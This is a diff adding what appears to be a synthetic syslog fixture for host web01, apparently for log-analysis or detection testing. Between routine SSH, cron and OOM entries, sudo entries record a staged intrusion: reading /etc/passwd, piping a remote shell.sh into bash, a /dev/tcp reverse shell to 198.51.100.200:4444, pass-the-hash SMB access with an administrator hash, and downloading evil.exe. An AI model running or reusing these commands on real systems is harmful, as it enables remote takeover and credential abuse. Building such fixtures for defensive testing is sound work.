@@ -1,0 +1,13 @@
+Jul 10 14:01:00 web01 sshd[1024]: Accepted publickey for admin from 10.0.0.50 port 55000 ssh2
+Jul 10 14:05:12 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/whoami
+Jul 10 14:05:13 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/bin/cat /etc/passwd
+Jul 10 14:05:15 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.200/shell.sh | /bin/bash
+Jul 10 14:05:20 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash -c exec bash -i &>/dev/tcp/198.51.100.200/4444 <&1
+Jul 10 14:10:00 web01 CRON[1500]: (root) CMD (   /usr/local/bin/logrotate.sh)
+Jul 10 14:15:00 web01 sshd[1100]: Failed password for invalid user root from 10.0.0.200 port 55555 ssh2
+Jul 10 14:15:00 web01 sshd[1100]: Failed password for invalid user root from 10.0.0.200 port 55556 ssh2
+Jul 10 14:15:00 web01 sshd[1100]: Failed password for invalid user root from 10.0.0.200 port 55557 ssh2
+Jul 10 14:15:00 web01 sshd[1100]: PAM 5 more authentication failures; rhost=10.0.0.200
+Jul 10 14:25:00 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/smbclient //10.0.0.10/C$ -U administrator%aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
+Jul 10 14:35:00 web01 sudo:     www-data : TTY=unknown ; PWD=/var/www ; USER=root ; COMMAND=/usr/bin/curl -s http://10.0.0.10/evil.exe -o /tmp/evil.exe
+Jul 10 14:45:00 web01 kernel: Out of memory: Kill process 5678 (node) score 800 or sacrifice child
